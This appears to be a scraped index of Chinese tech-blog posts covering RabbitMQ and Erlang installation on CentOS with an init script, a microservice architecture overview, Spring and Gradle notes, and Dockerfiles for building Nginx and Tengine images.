3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 更改系统的最大打开文件描述符数 本站教程 创建 Rabbitmq 用户和用户组 12345678# 切换root用户$ sudo -i# 创建rabbitmq用户组# groupadd rabbitmq# 创建rabbitmq用户（不允许远程登录）# useradd -g rabbitmq rabbitmq -s /bin/false 编译安装 Erlang 123456789101112131415161718192021222324252627282930313233343536373839# 安装依赖# yum install -y make autoconf gcc gcc-c++ glibc-devel kernel-devel m4 ncurses-devel openssl-devel unixODBC unixODBC-devel libtool libtool-ltdl-devel unzip# 创建下载目录# mkdir -p /home/rabbitmq/software# 下载# cd /home/rabbitmq/software# wget http://erlang.org/download/otp_src_22.0.tar.gz# 解压# tar -xvf otp_src_22.0.tar.gz# 删除下载文件# rm -f otp_src_22.0.tar.gz# 创建安装目录# mkdir -p /usr/local/erlang-22.0# 进入解压目录# cd otp_src_22.0# 配置# ./otp_build autoconf# ./configure --prefix=/usr/local/erlang-22.0 --without-javac# 编译安装# make &amp;&amp; make install# 创建软链接# ln -sf /usr/local/erlang-22.0/bin/erl /usr/bin/erl# 配置环境变量# vim /etc/profileexport ERLANG_HOME=/usr/local/erlang-22.0export PATH=$PATH:$ERLANG_HOME/bin# 使环境变量生效# source /etc/profile 二进制安装 RabbitMQ 1234567891011121314151617181920212223242526# 安装依赖# yum install -y xmlto python-simplejson# 下载# wget https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.7.15/rabbitmq-server-generic-unix-3.7.15.tar.xz# 解压# xz -d rabbitmq-server-generic-unix-3.7.15.tar.xz# tar -xvf rabbitmq-server-generic-unix-3.7.15.tar# 删除下载文件# rm -f rabbitmq-server-generic-unix-3.7.15.tar# 移动解压目录# mv rabbitmq_server-3.7.15 /usr/local/rabbitmq-3.7.15# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq-3.7.15# 配置环境变量# vim /etc/profileexport RabbitMQ_HOME=/usr/local/rabbitmq-3.7.15export PATH=$PATH:$RabbitMQ_HOME/sbin# 使环境变量生效# source /etc/profile RabbitMQ 基础配置、插件安装 123456789101112131415161718192021222324252627282930# 创建默认的日志目录与数据目录# mkdir -p /usr/local/rabbitmq-3.7.15/var/log/rabbitmq# mkdir -p /usr/local/rabbitmq-3.7.15/var/lib/rabbitmq/mnesia# 创建默认的配置文件# touch /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config# echo "[]." &gt; /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config# 创建默认的环境变量文件# touch /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf# echo "CONF_ENV_FILE=/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf" &gt;&gt; /usr/local/rabbitmq-3.7.15/sbin/rabbitmq-defaults# 启用Web控制台管理插件，浏览器可以通过url地址（http://127.0.0.1:15672）访问Web管理界面# 默认的登录账号和密码都是guest，由于账号guest具有所有的操作权限，并且又是默认账号，出于系统安全的考虑，RabbitMQ默认限制了guest只能通过localhost登录使用# rabbitmq-plugins enable rabbitmq_management# 安装延迟队列插件# cd /usr/local/rabbitmq/plugins# wget https://dl.bintray.com/rabbitmq/community-plugins/3.7.x/rabbitmq_delayed_message_exchange/rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# unzip rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# rm -f rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# 启用延迟队列插件# rabbitmq-plugins enable rabbitmq_delayed_message_exchange# 查看所有已安装的插件# rabbitmq-plugins list# 文件授权# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq-3.7.15 RabbitMQ 创建虚拟主机与超级管理员用户，设置角色权限 12345678910111213141516171819202122232425# 上面提到过出于系统安全考虑，rabbitmq默认限制了guest只能通过localhost登录使用，因此需要手动创建管理员帐号，并更改guest用户默认的密码# 前台启动RabbitMQ服务（默认会打印出日志文件和配置文件的路径）# rabbitmq-server# 或者后台启动RabbitMQ服务# rabbitmq-server -detached# 创建虚拟主机（相当于mysql的数据库概念）# rabbitmqctl add_vhost /# 更改guest用户默认的密码# rabbitmqctl change_password guest yourPassword# 创建超级管理员用户# rabbitmqctl add_user admin yourPassword# 赋予administrator角色给超级管理员用户# rabbitmqctl set_user_tags admin administrator# 赋予超级管理员用户权限# rabbitmqctl set_permissions -p / admin \'.*\' \'.*\' \'.*\'# 彻底关闭后台启动的RabbitMQ服务# ./rabbitmqctl stop 配置防火墙 1234567891011# 配置防火墙永久开放rabbitmq的端口，其中5672是客户端通信端口，15672是web管理界面的端口，25672是server间内部通信端口，4369是erlang发现端口# firewall-cmd --zone=public --permanent --add-port=5672/tcp# firewall-cmd --zone=public --permanent --add-port=15672/tcp# firewall-cmd --zone=public --permanent --add-port=25672/tcp# firewall-cmd --zone=public --permanent --add-port=4369/tcp# 保存防火墙配置# firewall-cmd --reload# 查看防火墙已开放的端口# firewall-cmd --list-ports 开机自启动 RabbitMQ 1234567891011# 创建服务自启动脚本# touch /etc/init.d/rabbitmq-server# 更改服务自启动脚本，写入后面给出的脚本内容即可，如果是在其他系统环境里安装，只需修改脚本里的USER、MQ_HOME# vim /etc/init.d/rabbitmq-server# 服务自启动脚本授权# chmod u+x /etc/init.d/rabbitmq-server# 开机自启动# chkconfig rabbitmq-server on 管理 RabbitMQ 服务 1234567891011121314151617181920212223# 关闭服务# systemctl stop rabbitmq-server# 启动服务# systemctl start rabbitmq-server# 重启服务# systemctl restart rabbitmq-server# 查看服务状态# systemctl status rabbitmq-server# 查看运行状态# rabbitmqctl status# 循环日志文件# rabbitmqctl rotate_logs[suffix]# 重置（前提是rabbitmq已停止），从它属于的任何集群中移除，从管理数据库中移除所有数据，例如配置过的用户和虚拟宿主, 删除所有持久化的消息。# rabbitmqctl reset# 强制重置（前提是rabbitmq已停止）,force_reset命令和reset的区别是无条件重置节点，不管当前管理数据库状态以及集群的配置。如果数据库或者集群配置发生错误才使用这个最后的手段。# rabbitmqctl force_reset RabbitMQ 服务自启动脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#!/bin/sh## rabbitmq-server RabbitMQ broker## chkconfig: - 80 05# description: Enable AMQP service provided by RabbitMQ#### BEGIN INIT INFO# Provides: rabbitmq-server# Required-Start: $remote_fs $network# Required-Stop: $remote_fs $network# Description: RabbitMQ broker# Short-Description: Enable AMQP service provided by RabbitMQ broker### END INIT INFO# Source function library.. /etc/init.d/functionsexport HOME=/home/rabbitmqPATH=/sbin:/usr/sbin:/bin:/usr/binUSER=rabbitmqNAME=rabbitmq-serverMQ_HOME=/usr/local/rabbitmq-3.7.15DAEMON=${MQ_HOME}/sbin/${NAME}CONTROL=${MQ_HOME}/sbin/rabbitmqctlROTATE_SUFFIX=DESC=rabbitmq-serverMAX_OPEN_FILES=1048576ulimit -n $MAX_OPEN_FILESSTART_PROG="daemon"PID_FILE=/var/run/rabbitmq/pidLOCK_FILE=/var/lock/subsys/$NAMEINIT_LOG_DIR=${MQ_HOME}/var/log/rabbitmqtest -x $DAEMON || exit 0test -x $CONTROL || exit 0RETVAL=0set -e[ -f /etc/default/${NAME} ] &amp;&amp; . /etc/default/${NAME}ensure_pid_dir () { PID_DIR=`dirname ${PID_FILE}` if [ ! -d ${PID_DIR} ] ; then mkdir -p ${PID_DIR} chown -R ${USER}:${USER} ${PID_DIR} chmod 755 ${PID_DIR} fi}remove_pid () { rm -f ${PID_FILE} rmdir `dirname ${PID_FILE}` || :}start_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then echo RabbitMQ is currently running else RETVAL=0 ensure_pid_dir set +e RABBITMQ_PID_FILE=$PID_FILE $START_PROG $DAEMON \\ &gt; "${INIT_LOG_DIR}/startup_log" \\ 2&gt; "${INIT_LOG_DIR}/startup_err" \\ 0&lt;&amp;- &amp; $CONTROL wait $PID_FILE &gt;/dev/null 2&gt;&amp;1 RETVAL=$? set -e case "$RETVAL" in 0) echo SUCCESS if [ -n "$LOCK_FILE" ] ; then touch $LOCK_FILE fi ;; *) remove_pid echo FAILED - check ${INIT_LOG_DIR}/startup_\\{log, _err\\} RETVAL=1 ;; esac fi}stop_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then set +e $CONTROL stop ${PID_FILE} &gt; ${INIT_LOG_DIR}/shutdown_log 2&gt; ${INIT_LOG_DIR}/shutdown_err RETVAL=$? set -e if [ $RETVAL = 0 ] ; then remove_pid if [ -n "$LOCK_FILE" ] ; then rm -f $LOCK_FILE fi else echo FAILED - check ${INIT_LOG_DIR}/shutdown_log, _err fi else echo RabbitMQ is not running RETVAL=0 fi}status_rabbitmq() { set +e if [ "$1" != "quiet" ] ; then $CONTROL status 2&gt;&amp;1 else $CONTROL status &gt; /dev/null 2&gt;&amp;1 fi if [ $? != 0 ] ; then RETVAL=3 fi set -e}rotate_logs_rabbitmq() { set +e $CONTROL rotate_logs ${ROTATE_SUFFIX} if [ $? != 0 ] ; then RETVAL=1 fi set -e}restart_running_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then restart_rabbitmq else echo RabbitMQ is not runnning RETVAL=0 fi}restart_rabbitmq() { stop_rabbitmq start_rabbitmq}case "$1" in start) echo -n "Starting $DESC: " start_rabbitmq echo "$NAME." ;; stop) echo -n "Stopping $DESC: " stop_rabbitmq echo "$NAME." ;; status) status_rabbitmq ;; rotate-logs) echo -n "Rotating log files for $DESC: " rotate_logs_rabbitmq ;; force-reload|reload|restart) echo -n "Restarting $DESC: " restart_rabbitmq echo "$NAME." ;; try-restart) echo -n "Restarting $DESC: " restart_running_rabbitmq echo "$NAME." ;; *) echo "Usage: $0 {start|stop|status|rotate-logs|restart|condrestart|try-restart|reload|force-reload}" &gt;&amp;2 RETVAL=1 ;;esacexit $RETVAL 配置概述 123456安装目录：/usr/local/rabbitmq-3.7.15日志目录：/usr/local/rabbitmq-3.7.15/var/log/rabbitmq数据目录：/usr/local/rabbitmq-3.7.15/var/lib/rabbitmq/mnesia配置文件：/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config环境变量配置文件：/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf自启动脚本：/etc/init.d/rabbitmq-server var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"浅析微服务架构技术",url:"/posts/6b304602.html",text:'微服务与微服务架构微服务的概述微服务理论的提出者马丁。福勒（Martin Fowler） 在其博客中详细描述了什么是微服务。微服务强调的是服务的大小，它关注的是某一个点，是具体解决某一个问题 / 提供落地对应服务的一个服务应用；狭意的看，可以看作 Eclipse 里面的一个个微服务工程 / 或者 Module。 微服务架构的概述微服务架构是一种架构模式或者说是一种架构风格，它提倡将单一应用程序划分为一组小服务，每个服务运行在自己的独立进程中，服务间通信采用轻量级通信机制 (通常是基于 HTTP 的 RESTful API)。每个服务都围绕着具体业务进行构建，并且能够被独立地部署到生产环境、类生产环境等。另外，应该尽量避免统一的、集中式的服务管理机制，对具体的一个服务而言，应根据业务上下文，选择合适的语言、工具对其进行构建，可以有一个非常轻量级的集中式管理来协调这些服务，可以使用不同的语言来编写服务，也可以使用不同的数据存储技术。 微服务架构的优缺点 优点： 易于开发和维护：一个微服务只会关注一个特定的业务功能，所以它业务清晰，代码量较少 单个微服务启动较快：单个微服务代码量较少，所以启动会比较快 业务之间松耦合，无论是在开发阶段或者部署阶段，不同的服务都是互相独立的 局部修改容易部署：单体应用只要有修改，就得重新部署整个应用，微服务解决了这样的问题 技术栈不受限：在微服务架构中，可以结合项目业务及团队的特点，合理地选择技术栈 按需伸缩：可根据需求，实现细粒度的扩展 缺点： 运维要求高：更多的服务意味着更多的运维投入 技术开发难度高：涉及到网络通信延迟、服务容错、数据一致性、系统集成测试、性能监控等 分布式固有的复杂性：使用微服务架构的是分布式系统，对于一个分布式系统，系统容错，网络延迟，分布式事务等都会带来巨大的挑战 接口调整成本高：微服务之间通过接口进行通信。如果修改某一个微服务的 API，可能所有使用了该接口的微服务都需要做调整 重复劳动：很多服务可能都会使用到相同的功能，而这个功能并没有达到分解为一个微服务的程度，这个时候，可能各个服务都会开发这一功能，从而导致代码重复 微服务项目的模块拆分示例 edu-common-parent（Maven 父配置） edu-common（公共模块） edu-common-config（公共 Config 模块） edu-common-core（公共 Core 模块） edu-common-web（公共 Web 模块） edu-facade-user（用户服务接口） edu-service-user（用户服务提供者） edu-web-boss（用户服务消费者） 传统项目与微服务项目的区别 传统的 Maven 单模块项目，最终会打包成单个 Java 或 Web 应用 传统的 Maven 多模块项目，各模块之间直接通过 Maven 依赖来实现 Java 代码的互相调用与代码重用，最终会打包成单个或多个 Java 或 Web 应用，若多个应用之间需要互相通信，则采用 TCP/HTTP 等协议，可扩展为集群架构。 微服务的 Maven 多模块项目，部分模块之间通过 Maven 依赖来实现 Java 代码的互相调用与代码重用，一般会引入注册中心来实现服务的自动注册与发现，最终会打包成多个 Java 或 Web 应用，多个应用之间通过 RPC/RESTful API 进行调用。 微服务解决方案选型服务治理框架对比 基于 Dubbo 的微服务解决方案Dubbo 未来的定位并不是要成为一个微服务的全面解决方案，而是专注于 RPC 领域，成为微服务生态体系中的一个重要组件。至于微服务化衍生出的服务治理需求，Dubbo 正在积极适配开源解决方案，并且已经启动独立的开源项目予以支持。因此基于 Dubbo 的微服务解决方案是：Dubbo + Nacos + Sentinel + 其他。 基于 Spring Cloud 的微服务解决方案SpringCloud 的技术选择性是中立的，因此可以随需更换搭配使用，基于 SpringCloud 的微服务落地解决方案大致可以分为以下三种： 服务注册与发现注册中心对比 ZooKeeper 在分布式 / 微服务系统中的角色ZooKeeper 是一种分布式 / 微服务协调服务，用于管理大型主机，包括分布式锁、服务注册与发现。其中 Zookeeper 是为读多写少的场景所设计，并不是用来存储大规模业务数据，而是用于存储少量的状态和配置信息，每个节点的数据最大不能超过 1MB。 统一配置中心Spring Cloud Config 配置中心架构Spring Cloud Config 基于消息总线的架构图如下，该架构需要依赖外部的 MQ 组件，如 Rabbit、Kafka 实现远程环境事件变更通知，客户端实时配置变更可以基于 Git Hook 功能实现。当依赖的消息组件出现问题时，此时如果 Git 仓库 配置发生了变更，会导致部分或所有客户端可能无法获取到最新配置，这样就造成了客户端应用配置数据无法达到最终一致性，进而引起线上问题。架构图中的 Self scheduleing refresher 就是为了解决该问题，它是一个定时任务，执行时会判断本地的 Git 仓库版本与远程 Git 仓库版本是否一致，若不一致则会从配置中心获取最新配置进行加载，保障了配置最终一致性。 路由网关路由网关的性能对比 Spring Cloud Gateway ~ Zuul 2 &lt;&lt; OpenResty ~&lt; Kong &lt;&lt; Direct（直连） Spring Cloud Gateway、Zuul 2 的性能差不多，大概是直连的 35%-40% OpenResty、Kong 差不多，大概是直连的 60%-70% 值得一提的是，在大并发场景下，例如模拟 200 并发用户、1000 并发用户时，Zuul 2 会有很大概率返回出错，这也说明 Zuul 2 目前还不成熟。Kong 的性能非常不错，非常适合做流量网关，并且对于 service、route、upstream、consumer、plugins 的抽象，也是自研网关值得借鉴的。但对于复杂系统，不建议业务网关用 Kong，或者更明确的说是不建议在 Java 技术栈的系统深度定制 Kong 或 OpenResty，主要是工程性方面的考虑。举个例子：假如有很多个不同业务线，鉴权方式五花八门，都是与业务多少有点相关的；这时如果把鉴权在网关实现，就需要维护大量的 Lua 脚本，引入一个新的复杂技术栈是一个成本不低的事情。Spring Cloud Gateway、Zuul2 对于 Java 技术栈来说比较方便，可以依赖业务系统的一些 Common 组件；而使用 Lua 开发不方便，不光是语言的问题，更是复用基础设施的问题。另外，对于网关系统来说，性能不是差一个数量级，问题不是很大，多加机器就可以搞定。 Spring Cloud Gateway 与 Zuul 1.x 对比 底层实现：Zuul 1.x 基于 Servlet 2.5 构建，使用的是阻塞的 I/O 模型。Gateway 是基于 Spring 5.x、Spring Boot 2.x、Spring WebFlux 和 Project Reactor 等技术，底层使用 Netty 的非阻塞 I/O 模型。 长连接：Gateway 支持长连接，而 Zuul 1.x 不支持长连接（如 WebSocket），不适用后端服务响应慢或者高并发场景下，因为线程数量是固定（有限）的，线程容易被耗尽，导致新请求被拒绝处理。 限流：Zuul 1.x 需要通过 Filter 实现限流扩展，Gateway 内置了限流过滤器。 性能：根据官方提供的基准测试，Spring Cloud Gateway 的 RPS（每秒请求数）是 Zuul 1.x 的 1.6 倍，平均延迟是 Zuul 1.x 的一半。 技术栈沉淀：Zuul 1.x 开源近七年，经受考验，稳定成熟，Gateway 未见实际落地案例，Github 统计如下： 仓库数量 issues 数量 说明 Zuul1.x 1007 repositories Zuul1.x 88 Open / 2736 Closed 统计时间截止 2019/8/26 Gateway 102 repositories Gateway 135 Open / 850 Closed 统计时间截止 2019/8/26 杂项分布式锁的实现方案 Redisson：Redis 官方的分布式锁实现 Zookeeper：利用 Zookeeper 的顺序临时节点，来实现分布式锁和等待队列 Chubby：Google 公司实现的粗粒度分布式锁服务，底层利用了 Paxos 一致性算法 Redis：和 Memcached 的方式类似，利用 Redis 的 setnx 命令，此命令同样是原子性操作，只有在 key 不存在的情况下才能 set 成功 Memcached：利用 Memcached 的 add 命令，此命令是原子性操作，只有在 key 不存在的情况下才能 add 成功，也就意味着线程得到了锁 Nginx 动态更新 upstream 的方案在不使用服务发现中间件（如 Zookeeper、Eureka、Consul）的场景下，使用传统的基于代理的负载均衡解决方案（如 Nginx），此时可以考虑使用以下方案动态更新服务提供者列表。 手工或者通过脚本方式，在部署的时候去更新 Nginx 的配置文件，然后 reload 使用 ngx_http_dyups_module 模块，通过 REST API 来在运行时直接更新 upstream 而不需要 reload consul-template + Nginx 的方案一，通过 consul 监听服务实例的变化，然后更新 Nginx 的配置文件，通过 reload 实现服务列表的更新 consul-template + Nginx 的方案二，Nginx 在运行时通过 consul 获取服务列表来实现动态 upstream 的路由 OpenResty + Lua 的方案，通过 Lua 脚本实现动态 upstream 的路由 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"微服务 架构"},{title:"Spring 开发随笔",url:"/posts/19b24d.html",text:'@RequestRequestBody 注解抛出异常信息 “Required request body is missing” 采用 SSM 框架，前端将参数传递给后端，SpringMVC 可以通过注解 @RequestBody 将传递参数绑定在 Controller 的方法参数中。此时必须注意，当请求方法声明为 GET 和 DELETE 的时候，HTTP 请求规范里规定是不会有 RequestBody 的，只有请求方法声明为 POST 和 PUT 的时候才有，因此 @RequestBody 不适用于 GET 与 DELETE 方法。还有如果请求方法声明为 GET、DELETE，那么 SpringMVC 可以直接将传递参数绑定在方法的参数中，如果请求方法声明为 POST、PUT，则必须使用注解 @RequestBody 修饰 Controller 中的方法参数，否则无法获取前端传递过来的参数值。正确的使用方法如下： 1234567891011121314151617181920212223242526272829303132333435363738@Controller@RequestMapping("/user/api")public class UserApiController { @Autowired private UserApiService userApiService; @ResponseBody @RequestMapping(value = "/get/{id}", method = RequestMethod.GET) public RequestResult&lt;UserApiVo&gt; getById(@PathVariable("id") int id) { return userApiService.get(id); } @ResponseBody @RequestMapping(value = "/query", method = RequestMethod.GET) public RequestResult&lt;Page&gt; query(Page page) { return userApiService.query(page); } @ResponseBody @RequestMapping(value = "/add", method = RequestMethod.POST) public RequestResult add(@RequestBody @Valid UserApiVo vo) { return userApiService.add(vo); } @ResponseBody @RequestMapping(value = ("/update"), method = RequestMethod.POST) public RequestResult update(@RequestBody @Valid UserApiVo vo) { return userApiService.update(vo); } @ResponseBody @RequestMapping(value = "/delete/{id}", method = RequestMethod.DELETE) public RequestResult delete(@PathVariable("id") int id) { return userApiService.delete(id); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java 开发随笔"},{title:"Gradle 基础使用教程",url:"/posts/2148b5a7.html",text:'相关站点 Gradle Plugin 官网 Gradle 知识点 构建脚本的编写 创建自定义构建任务 创建自定义插件 构建生命周期 依赖管理 版本冲突解决 多项目构建 自动化测试 项目打包发布 Gradle 子模块依赖父模块中的资源文件 12345678910111213141516// 方法一，在子模块的build.gradle中，指定父模块的资源文件sourceSets { main { resources { // 指定资源文件目录，若存在同名资源文件，左边声明的默认会被右边声明的所覆盖 srcDirs = [\'src/main/resources\', \'../common/build/resources/main\'] } }}// 方法二，在子模块的build.gradle中，指定父模块的资源文件processResources { // 指定资源文件目录，若存在同名资源文件，先声明的默认会被后声明的所覆盖 from(\'src/main/resources\') from(\'../common/build/resources/main\')} Gradle 编译时，子模块依赖父模块的 Jar 包类 1234// 在父模块的build.gradle中，添加以下内容jar { enabled = true} Gradle 打成 Jar 包后包含所有依赖 123456789jar { manifest { attributes( "Manifest-Version": 1.0, "Main-Class": "com.zhiduoduo.proxy.ProxyApplication" ) } from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }} Gradle 中的 apply plugin 与 plugins 的区别 12345678910111213141516// Gradle 新版本的写法如下：plugins { id \'org.springframework.boot\' version \'2.1.0.RELEASE\'}// Gradle 2.0及更旧版本的写法如下：buildscript { repositories { mavenCentral() } dependencies { classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}") }}apply plugin: \'org.springframework.boot\' Gradle 添加 lombok 依赖 123456dependencies { compileOnly \'org.projectlombok:lombok:1.18.6\' testCompileOnly \'org.projectlombok:lombok:1.18.6\' annotationProcessor \'org.projectlombok:lombok:1.18.6\' testAnnotationProcessor \'org.projectlombok:lombok:1.18.6\'} Gradle 编译时取消所有测试 123test { exclude \'**/*\'} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"java"},{title:"编程语言分类",url:"/posts/dbbdce78.html",text:'编程四大基础 数据结构与算法、计算机网络、操作系统、设计模式 底层开发 汇编、C、C++ Web 开发 Java、PHP、Python、Go、Ruby 大数据 Java、Scala 区块链 Go 人工智能 Python 数据分析、数据挖掘、爬虫 Python Android 开发 Java、Kotlin、Groovy IOS 开发 Objective-C、Swift 其他开发 Perl、Lua、Shell var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"开发随笔"},{title:"编写 DockerFile 构建 Nginx 与 Tengine 镜像",url:"/posts/e34a05cd.html",text:'Nginx 镜像的 DockerFile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960FROM centos:7MAINTAINER peter&lt;peter@gmail.com&gt;# 安装软件RUN yum -y update &amp;&amp; yum -y install gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel# 创建用户RUN groupadd wwwRUN useradd -g www www -s /bin/false# 定义Nginx版本号ENV VERSION 1.14.2# 下载并解压文件RUN mkdir -p /usr/local/src/ADD http://nginx.org/download/nginx-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/nginx-$VERSION.tar.gz -C /usr/local/src/# 创建安装目录ENV NGINX_HOME /usr/local/nginxRUN mkdir -p $NGINX_HOMERUN chown -R www:www $NGINX_HOME# 进入解压目录WORKDIR /usr/local/src/nginx-$VERSION# 编译安装RUN ./configure \\ --user=www \\ --group=www \\ --prefix=$NGINX_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_moduleRUN makeRUN make install# 备份Nginx的配置文件RUN mv $NGINX_HOME/conf/nginx.conf $NGINX_HOME/conf/nginx.conf.default# 设置环境变量ENV PATH $PATH:$NGINX_HOME/sbin# 创建WebApp目录ENV WEB_APP /usr/share/nginx/htmlRUN mkdir -p $WEB_APP# 设置默认工作目录WORKDIR $WEB_APP# 暴露端口EXPOSE 80EXPOSE 443# 清理压缩包与解压文件RUN rm -rf /usr/local/src/nginx*CMD $NGINX_HOME/sbin/nginx -g \'daemon off;\' -c $NGINX_HOME/conf/nginx.conf 构建 Nginx 镜像 12# 构建Nginx镜像# docker build -f docker-file -t peter/nginx:1.14.2 . Docker-Compose 管理 Nginx 镜像 1234567891011121314151617version: "3.5"services: nginx: image: peter/nginx:1.14.2 container_name: nginx-1.14.2 privileged: false ports: - 80:80 - 443:443 volumes: - \'/container/nginx/wwwroot:/usr/share/nginx/html\' - \'/container/nginx/logs:/usr/local/nginx/logs\' - \'/container/nginx/nginx.conf:/usr/local/nginx/conf/nginx.conf\'# 上面的配置是docker-compose.yml文件的内容，数据卷部分可以根据自己的实际情况进行修改# 注意： 在/container/nginx/nginx.conf配置文件中，需要手动修改root的路径为/usr/share/nginx/html 创建并启动 Nginx 容器 12345# 创建并启动容器# docker-compose up -d# 查看容器的运行状态# docker-compose ps Tengine 镜像的 DockerFile 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061FROM centos:7MAINTAINER peter&lt;peter@gmail.com&gt;# 安装软件RUN yum -y update &amp;&amp; yum -y install vim tree htop tmux net-tools telnet wget curl supervistor autoconf git gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel# 创建用户RUN groupadd tengineRUN useradd -g tengine tengine# 定义Tengine版本号ENV VERSION 2.2.3# 下载并解压文件RUN mkdir -p /usr/local/src/ADD http://tengine.taobao.org/download/tengine-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/tengine-$VERSION.tar.gz -C /usr/local/src/# 创建安装目录ENV TENGINE_HOME /usr/local/tengineRUN mkdir -p $TENGINE_HOME# 进入解压目录WORKDIR /usr/local/src/tengine-$VERSION# 编译安装RUN ./configure \\ --user=tengine \\ --group=tengine \\ --prefix=$TENGINE_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_moduleRUN makeRUN make install# 备份Tengine的配置文件RUN mv $TENGINE_HOME/conf/nginx.conf $TENGINE_HOME/conf/nginx.conf.default# 设置环境变量ENV PATH $PATH:$TENGINE_HOME/sbin# 创建WebApp目录ENV WEB_APP /usr/share/tengine/htmlRUN mkdir -p $WEB_APP# 设置默认工作目录WORKDIR $WEB_APP# 暴露端口EXPOSE 80EXPOSE 443# 清理压缩包与解压文件RUN rm -rf /usr/local/src/tengine*CMD $TENGINE_HOME/sbin/nginx -g \'daemon off;\' -c $TENGINE_HOME/conf/nginx.conf 构建 Tengine 镜像 12# 构建Tengine镜像# docker build -f docker-file -t peter/tengine:2.2.3 . Docker-Compose 管理 Tengine 镜像 123456789101112131415161718version: "3.5"services: tengine: image: peter/tengine:2.2.3 container_name: tengine:2.2.3 restart: always privileged: false ports: - 80:80 - 443:443 volumes: - \'/container/tengine/wwwroot/:/usr/share/tengine/html\' - \'/container/tengine/logs:/usr/local/tengine/logs\' - \'/container/tengine/nginx.conf:/usr/local/tengine/conf/nginx.conf\'# 